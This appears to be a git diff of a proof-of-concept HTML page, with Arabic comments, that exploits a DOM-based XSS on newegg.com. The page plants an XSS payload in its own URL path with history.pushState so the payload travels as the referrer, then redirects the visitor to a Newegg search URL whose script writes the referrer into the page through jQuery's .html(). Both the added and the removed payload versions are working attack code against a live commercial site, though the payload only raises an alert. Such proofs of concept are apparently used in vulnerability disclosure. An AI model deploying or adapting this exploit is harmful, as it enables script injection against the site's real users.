@@ -1,29 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC Mouad</title>
+    <title>Newegg DOM XSS PoC - Mouad</title>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
+<body style="background:#000; color:#fff; text-align:center; padding-top:100px; font-family: Arial, sans-serif;">
 
-    <h1>Newegg DOM Analysis</h1>
-    <a id="attackBtn" href="#" style="padding:20px; background:orange; color:white; text-decoration:none; border-radius:10px;">
-        Click to Trigger 🚀
-    </a>
+    <div style="border:1px solid #ff9900; display:inline-block; padding:40px; border-radius:10px;">
+        <h1 style="color:#ff9900;">Newegg Vulnerability Lab</h1>
+        <p>Target: <code>document.referrer</code> -> <code>.html()</code> Sink</p>
+        <p style="color:#888;">بمجرد الضغط على الزر، سيتم تغيير العنوان برمجياً لإرسال البايلود</p>
+        
+        <br>
+        <a id="exploitLink" href="#" style="padding:15px 30px; background:#ff9900; color:#000; text-decoration:none; font-weight:bold; border-radius:5px;">
+            RUN EXPLOIT 🚀
+        </a>
+    </div>
 
     <script>
-        // سنستخدم Payload لا يحتوي على مسافات أو رموز تكسر الـ JSON parse
-        // نستخدم `onmouseenter` بدلاً من `onmouseover` لتجنب التكرار
-        var xss = '"><b/onmouseenter=alert(document.domain)>MOUAD';
-        
-        // بناء مسار بسيط جداً لكي لا يكسر دالة split أو reduce
-        var cleanPath = "/VORTEX/" + encodeURIComponent(xss);
+        // 1. البايلود: نغلق الوسم المفتوح في Newegg ونحقن وسم جديد
+        // استخدمنا onmouseenter لتجنب حظر الـ Inline Scripts في بعض المتصفحات
+        var payload = '"><img src=x onerror=alert(`XSS_BY_MOUAD_DOMAIN:`+document.domain)>';
 
-        // تغيير العنوان
-        window.history.pushState({}, '', cleanPath);
+        // 2. بناء المسار: الكود في Newegg يقرأ الخانة رقم 3 بعد الـ split("/")
+        // الرابط سيصبح: https://mouad-al4.github.io/البايلود/
+        var attackUrl = "/" + payload + "/";
 
-        // الانتقال للموقع
-        document.getElementById('attackBtn').href = "https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad";
+        // 3. تغيير عنوان المتصفح بدون إعادة تحميل (لإرساله كـ Referrer)
+        window.history.pushState({}, '', attackUrl);
+
+        // 4. توجيه الرابط إلى Newegg مع البارامتر المشغل للسكربت
+        document.getElementById('exploitLink').onclick = function(e) {
+            e.preventDefault();
+            window.location.href = "https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad";
+        };
     </script>
 </body>
 </html>
